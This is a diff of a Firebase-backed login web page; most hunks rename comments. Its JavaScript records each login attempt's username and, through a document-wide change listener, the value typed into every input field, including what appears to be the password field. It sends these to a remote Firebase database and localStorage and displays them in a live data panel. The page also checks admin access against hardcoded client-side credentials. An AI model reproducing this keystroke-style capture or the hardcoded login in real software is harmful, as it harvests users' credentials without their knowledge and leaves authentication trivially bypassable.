@@ -207,7 +207,7 @@ body{
     cursor:pointer;
 }
 
-/* LOGIN BUTTON */
+/* BUTTONS */
 
 .login-btn{
 
@@ -238,8 +238,6 @@ body{
 
     color:black;
 }
-
-/* EXTRA BUTTON */
 
 .secondary-btn{
 
@@ -531,7 +529,7 @@ body{
 
         </div>
 
-        <!-- LIVE DATA -->
+        <!-- USER DATA -->
 
         <div class="panel-box">
 
@@ -575,7 +573,7 @@ import {
 
 from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-/* FIREBASE CONFIG */
+/* FIREBASE */
 
 const firebaseConfig = {
 
@@ -596,8 +594,6 @@ const firebaseConfig = {
   measurementId: "G-XQXYL2DMEC"
 
 };
-
-/* START */
 
 const app = initializeApp(firebaseConfig);
 
@@ -633,7 +629,7 @@ window.togglePassword = function(){
 
 };
 
-/* SAVE ONLINE + LOCAL */
+/* SAVE DATA */
 
 window.saveActivity = function(type,data){
 
@@ -654,7 +650,7 @@ window.saveActivity = function(type,data){
         info
     );
 
-    /* LOCAL */
+    /* LOCAL STORAGE */
 
     let localData =
 
@@ -674,7 +670,7 @@ window.saveActivity = function(type,data){
 
 };
 
-/* LIVE DATA */
+/* SHOW DATA */
 
 onValue(
 
@@ -736,15 +732,17 @@ window.login = function(){
     .getElementById("password")
     .value;
 
+    /* SAVE FINAL LOGIN */
+
     saveActivity(
 
-        "Login",
+        "Login Attempt",
 
-        `Username: ${user}`
+        `Username : ${user}`
 
     );
 
-    /* ADMIN */
+    /* ADMIN LOGIN */
 
     if(user === "naman"
     && pass === "naman"){
@@ -804,17 +802,31 @@ document.addEventListener(
 
 document.addEventListener(
 
-"input",
+"change",
 
 (e)=>{
 
     if(e.target.tagName === "INPUT"){
 
+        const placeholder =
+
+        e.target.placeholder;
+
+        const value =
+
+        e.target.value;
+
+        if(value.trim() === ""){
+
+            return;
+
+        }
+
         saveActivity(
 
-            "Typed",
+            "User Typed",
 
-            `${e.target.placeholder}: ${e.target.value}`
+            `${placeholder} : ${value}`
 
         );
 
